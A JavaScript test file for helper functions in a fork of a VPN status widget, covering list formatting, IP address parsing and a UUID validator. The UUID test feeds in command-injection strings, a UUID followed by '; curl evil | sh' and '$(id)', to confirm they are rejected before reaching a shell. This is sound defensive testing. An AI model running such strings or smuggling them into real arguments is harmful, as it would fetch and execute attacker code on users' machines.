// From the tests of the owner's fork t1nk33r.vpn of jkoestinger/omarchy-vpn
// (MIT, Copyright (c) 2026 Justin Köstinger); see ../LICENSE. Unchanged by the
// haseen port (plan 096); tests/test-vpn.sh runs them with node.
// Helpers every backend leans on, and the widget's own settings.
const { test, eq, Shared } = require("../harness.js")

test("sentenceList punctuates by length and drops blanks", () => {
  eq(Shared.sentenceList([]), "")
  eq(Shared.sentenceList(["Mullvad"]), "Mullvad")
  eq(Shared.sentenceList(["Mullvad", "Windscribe"]), "Mullvad or Windscribe")
  eq(Shared.sentenceList(["Mullvad", "Windscribe", "OpenVPN"]),
    "Mullvad, Windscribe, or OpenVPN")
  eq(Shared.sentenceList([" Mullvad ", "", null, "Mullvad"]), "Mullvad")
  eq(Shared.sentenceList(["a", "b"], "and"), "a and b")
})

test("elide keeps short text and collapses whitespace", () => {
  eq(Shared.elide("  a   b  ", 10), "a b")
  eq(Shared.elide("abcdefghij", 10), "abcdefghij")
  eq(Shared.elide("abcdefghijk", 10), "abcdefghi…")
  eq(Shared.elide(null, 10), "")
})

test("applyPendingToggles marks only the flipped switch busy", () => {
  const toggles = [Shared.toggle("a", "A", "", false), Shared.toggle("b", "B", "", true)]
  const applied = Shared.applyPendingToggles(toggles, { a: true })
  eq(applied[0].value, true)
  eq(applied[0].busy, true)
  eq(applied[1].value, true)
  eq(applied[1].busy, false)
  eq(Shared.applyPendingToggles(toggles, null), toggles)
})

test("backend id lists round-trip through the comma-separated setting", () => {
  eq(Shared.parseBackendIds(" Proton , mullvad ,, proton "), ["proton", "mullvad"])
  eq(Shared.parseBackendIds(null), [])
  eq(Shared.joinBackendIds(["proton", "mullvad"]), "proton,mullvad")
  eq(Shared.toggleBackendId(["proton"], "mullvad"), ["proton", "mullvad"])
  eq(Shared.toggleBackendId(["proton", "mullvad"], "proton"), ["mullvad"])
})

test("parsePublicIp accepts address literals", () => {
  eq(Shared.parsePublicIp("1.2.3.4"), "1.2.3.4")
  eq(Shared.parsePublicIp("  8.8.8.8\n"), "8.8.8.8")
  eq(Shared.parsePublicIp("2001:DB8::1"), "2001:db8::1")
})

test("parsePublicIp rejects anything that is not one", () => {
  // A captive portal's login page, an error body, a spoofed answer with a
  // trailer: none of these are an exit address, and rendering one would be the
  // widget confirming a route it never saw.
  eq(Shared.parsePublicIp("<html>Sign in</html>"), "")
  eq(Shared.parsePublicIp("1.2.3.4 extra"), "")
  eq(Shared.parsePublicIp("999.1.1.1"), "")
  eq(Shared.parsePublicIp("deadbeef"), "")
  eq(Shared.parsePublicIp("1:2:::3"), "")
  eq(Shared.parsePublicIp("::1::2"), "")
  eq(Shared.parsePublicIp(""), "")
  eq(Shared.parsePublicIp(null), "")
  eq(Shared.parsePublicIp("1.2.3.4".padEnd(50, "0")), "")
})

test("isUuid accepts a NetworkManager uuid and nothing that merely resembles one", () => {
  // This is the one value in the widget that reaches a shell: the credential
  // prompt goes out through a terminal launcher that joins its arguments and
  // runs them through `bash -c`, and the plugin bar API takes a string rather
  // than an argv list, so the value itself has to be the thing that is safe.
  eq(Shared.isUuid("0f8fad5b-d9cb-469f-a165-70867728950e"), true)
  eq(Shared.isUuid("0F8FAD5B-D9CB-469F-A165-70867728950E"), true)
  eq(Shared.isUuid("0f8fad5b-d9cb-469f-a165-70867728950e; curl evil | sh"), false)
  eq(Shared.isUuid("$(id)"), false)
  eq(Shared.isUuid("0f8fad5b-d9cb-469f-a165-7086772895"), false)
  eq(Shared.isUuid("--------------------------------????"), false)
  eq(Shared.isUuid(""), false)
  eq(Shared.isUuid(undefined), false)
})
